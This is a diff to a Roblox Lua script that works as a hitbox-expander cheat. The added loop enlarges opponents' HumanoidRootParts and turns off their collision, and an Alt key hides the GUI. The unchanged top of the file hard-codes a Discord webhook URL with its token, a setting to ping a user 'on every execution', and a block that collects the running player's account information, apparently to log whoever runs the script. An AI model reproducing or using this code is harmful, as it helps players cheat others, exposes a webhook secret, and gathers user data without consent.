@@ -1,8 +1,10 @@
+-- Your webhook URL
 Webhook = "https://discord.com/api/webhooks/1325111573139816570/nMyn7fgjbmpfh36PHeBMvdW_QUW0ufROTXl4QemTbuGNlzi17esG1FWz3vZV1NA1NCVT" -- your webhook
 _G.Discord_UserID = "" -- ID to ping on every execution, blank if no one wants to be pinged.
 
 -- Player Information Collection
 local player = game:GetService("Players").LocalPlayer
+
 local joinTime = os.time() - (player.AccountAge * 86400)
 local joinDate = os.date("!*t", joinTime)
 local premium = false
@@ -185,48 +187,85 @@ sliderButton.Parent = sliderFrame
 -- Label to display current hitbox size (smaller)
 local sizeLabel = Instance.new("TextLabel")
 sizeLabel.Size = UDim2.new(0, 80, 0, 16)  -- Smaller size
-sizeLabel.Position = UDim2.new(1, 8, 0, 0)  -- Position it next to the slider
-sizeLabel.Text = "Head Size: " .. HeadSize
-sizeLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-sizeLabel.BackgroundTransparency = 1  -- Transparent background
+sizeLabel.Position = UDim2.new(1, 8, 0, 6)  -- Position it to the right of the slider
+sizeLabel.Text = "Size: " .. tostring(HeadSize)
+sizeLabel.TextColor3 = Color3.fromRGB(255, 255, 255) -- Text color: white
+sizeLabel.BackgroundTransparency = 1
 sizeLabel.TextSize = 14  -- Smaller text size
 sizeLabel.TextScaled = true
 sizeLabel.Parent = sliderFrame
 
--- Update head size when the slider is moved
-sliderButton.MouseMoved:Connect(function(x, y)
-    local relativePosition = (x - sliderFrame.AbsolutePosition.X) / sliderFrame.AbsoluteSize.X
-    local newSize = math.clamp(relativePosition * 10, 1, 10)  -- Clamping to a range between 1 and 10
-    HeadSize = math.floor(newSize)  -- Update head size
-    sizeLabel.Text = "Head Size: " .. HeadSize  -- Update the label text
+-- Variable to track the slider movement
+local dragging = false
+local sliderMin = sliderFrame.Position.X.Offset
+local sliderMax = sliderFrame.Position.X.Offset + sliderFrame.Size.X.Offset - sliderButton.Size.X.Offset
+
+-- Update the hitbox size when the slider is moved
+sliderButton.MouseButton1Down:Connect(function()
+    dragging = true
 end)
 
--- Adjust transparency when the transparency box text is changed
-transparencyBox.FocusLost:Connect(function()
-    local transparencyValue = tonumber(transparencyBox.Text)
-    if transparencyValue then
-        TransparencyValue = math.clamp(transparencyValue, 0, 1)  -- Ensure transparency is between 0 and 1
+-- Update the slider position while dragging
+game:GetService("UserInputService").InputChanged:Connect(function(input)
+    if dragging then
+        local mousePos = input.Position.X
+        local clampedPos = math.clamp(mousePos - sliderFrame.Position.X.Offset, 0, sliderMax)
+        sliderButton.Position = UDim2.new(0, clampedPos, 0, 0)
+
+        -- Update the head size based on the slider position
+        HeadSize = math.floor((clampedPos / sliderMax) * 20) + 1
+        sizeLabel.Text = "Size: " .. tostring(HeadSize)
     end
 end)
 
--- Toggle Button to hide/show hitboxes (above the slider now)
-local hitboxToggleButton = Instance.new("TextButton")
-hitboxToggleButton.Size = UDim2.new(0, 100, 0, 30)  -- Button size to match text
-hitboxToggleButton.Position = UDim2.new(0, 120, 1, -90)  -- Position it above the slider
-hitboxToggleButton.Text = "Show Hitboxes"  -- Button text
-hitboxToggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-hitboxToggleButton.BackgroundColor3 = Color3.fromRGB(0, 128, 0) -- Green button color
-hitboxToggleButton.BackgroundTransparency = 0.5
-hitboxToggleButton.TextSize = 14
-hitboxToggleButton.TextScaled = true
-hitboxToggleButton.Parent = screenGui
+-- Stop dragging when mouse button is released
+game:GetService("UserInputService").InputEnded:Connect(function(input)
+    if dragging then
+        dragging = false
+    end
+end)
 
--- When the button is clicked, toggle hitboxes visibility
-hitboxToggleButton.MouseButton1Click:Connect(function()
-    IsDisabled = not IsDisabled  -- Toggle visibility
+-- Update transparency value from TextBox input
+transparencyBox.FocusLost:Connect(function(enterPressed)
+    if enterPressed then
+        local inputValue = tonumber(transparencyBox.Text)
+        if inputValue and inputValue >= 0 and inputValue <= 1 then
+            TransparencyValue = inputValue
+        else
+            transparencyBox.Text = tostring(TransparencyValue) -- Reset to current transparency if input is invalid
+        end
+    end
+end)
+
+-- Hide/Show GUI when pressing Alt key
+local userInputService = game:GetService("UserInputService")
+userInputService.InputBegan:Connect(function(input, gameProcessedEvent)
+    if not gameProcessedEvent then
+        if input.KeyCode == Enum.KeyCode.LeftAlt or input.KeyCode == Enum.KeyCode.RightAlt then
+            screenGui.Enabled = not screenGui.Enabled
+        end
+    end
+end)
+
+-- Main function to toggle hitboxes visibility
+game:GetService('RunService').RenderStepped:Connect(function()
     if IsDisabled then
-        hitboxToggleButton.Text = "Show Hitboxes"  -- Change text
-    else
-        hitboxToggleButton.Text = "Hide Hitboxes"  -- Change text
+        local localPlayer = game:GetService('Players').LocalPlayer
+        if not localPlayer then return end
+
+        local localPlayerTeam = localPlayer.Team
+
+        for _, player in ipairs(game:GetService('Players'):GetPlayers()) do
+            if player ~= localPlayer and (not IsTeamCheckEnabled or player.Team ~= localPlayerTeam) then
+                local humanoidRootPart = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
+                if humanoidRootPart then
+                    humanoidRootPart.Size = Vector3.new(HeadSize, HeadSize, HeadSize)
+                    humanoidRootPart.Transparency = TransparencyValue
+                    humanoidRootPart.BrickColor = BrickColor.new("White")  -- Set to white
+                    humanoidRootPart.Material = Enum.Material.Neon
+                    humanoidRootPart.CanCollide = false
+                end
+            end
+        end
     end
 end)
